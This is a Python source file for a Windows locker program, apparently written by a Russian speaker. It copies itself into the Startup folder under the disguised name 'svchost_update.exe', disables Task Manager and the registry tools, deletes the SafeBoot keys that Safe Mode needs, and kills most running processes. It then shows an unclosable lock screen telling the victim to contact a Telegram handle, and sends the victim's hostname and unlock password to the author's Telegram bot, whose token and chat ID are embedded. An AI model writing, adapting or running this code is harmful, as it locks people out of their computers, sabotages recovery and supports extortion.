import os
import sys
import time
import shutil
import requests
import tkinter as tk
import psutil
import winreg
import threading
import random
import string
import socket

if os.name != 'nt':
    print("Only for Windows")
    sys.exit(1)

BOT_TOKEN = "8320512407:AAF8XKfXkVYUTP7x_FHHMo1oAK_CkFr95VM"
CHAT_ID = "8573437923"
LAST_UPDATE_ID = 0
unlock_ready = False

# Генерируем случайный пароль
PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def send_telegram_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def check_bot_for_unlock():
    global LAST_UPDATE_ID, unlock_ready
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    while True:
        try:
            res = requests.get(f"{url}?offset={LAST_UPDATE_ID + 1}&timeout=10").json()
            if res.get("result"):
                for update in res["result"]:
                    LAST_UPDATE_ID = update["update_id"]
                    if "callback_query" in update:
                        if update["callback_query"]["data"] == "confirm":
                            unlock_ready = True
                            return
        except: pass
        time.sleep(2)

def disable_system_tools():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteKey(key, "Minimal")
        winreg.DeleteKey(key, "Network")
        winreg.CloseKey(key)
    except: pass
    os.system('shutdown -a')

def kill_unwanted():
    allowed = ["explorer.exe", "python.exe", "victim_locker.exe", "conhost.exe", "dwm.exe", "cmd.exe", "chrome.exe", "firefox.exe", "telegram.exe", "discord.exe"]
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() not in allowed:
                    proc.kill()
            except: pass
        time.sleep(1)

def show_window():
    global unlock_ready
    root = tk.Tk()
    root.title("SYSTEM LOCKED")
    root.configure(bg="black")
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width//2}x{screen_height}+{screen_width//2}+0")
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nСвяжитесь с администратором для получения пароля.\n\nTelegram: @bogdan551128", 
                     fg="#ff0000", bg="black", font=("Consolas", 14, "bold"))
    label.pack(expand=True)

    entry_label = tk.Label(root, text="Введите пароль для разблокировки:", fg="white", bg="black")
    entry_label.pack(pady=(20, 5))
    
    entry = tk.Entry(root, show="*", font=("Arial", 14), width=20)
    entry.pack(pady=5)
    
    def check_pass():
        global unlock_ready
        # Пароль сработает, если введен верный ИЛИ ты нажал кнопку в боте
        if entry.get() == PASSWORD or unlock_ready:
            label.config(text="✅ Разблокировано.", fg="green")
            time.sleep(2)
            startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
            if os.path.exists(startup_path): os.remove(startup_path)
            os.system("shutdown -r -t 3")
            sys.exit(0)
        else:
            from tkinter import messagebox
            messagebox.showerror("ERROR", "Неверный пароль!")

    btn = tk.Button(root, text="Разблокировать", command=check_pass, bg="red", fg="white", font=("Arial", 12))
    btn.pack(pady=10)

    def wait_for_unlock():
        global unlock_ready
        check_bot_for_unlock()
        if unlock_ready:
            label.config(text="✅ Разблокировано администратором.", fg="green")
            time.sleep(2)
            startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
            if os.path.exists(startup_path): os.remove(startup_path)
            os.system("shutdown -r -t 3")
            sys.exit(0)

    threading.Thread(target=wait_for_unlock, daemon=True).start()
    threading.Thread(target=kill_unwanted, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
    try:
        shutil.copy(sys.executable, startup_path)
    except: pass
    
    # Отправляем уведомление с паролем
    hostname = socket.gethostname()
    send_telegram_msg(f"🚨 **Жертва запустила локер!**\n💻 ПК: `{hostname}`\n🔑 **ПАРОЛЬ ДЛЯ РАЗБЛОКИРОВКИ:** `{PASSWORD}`")

    disable_system_tools()
    show_window()

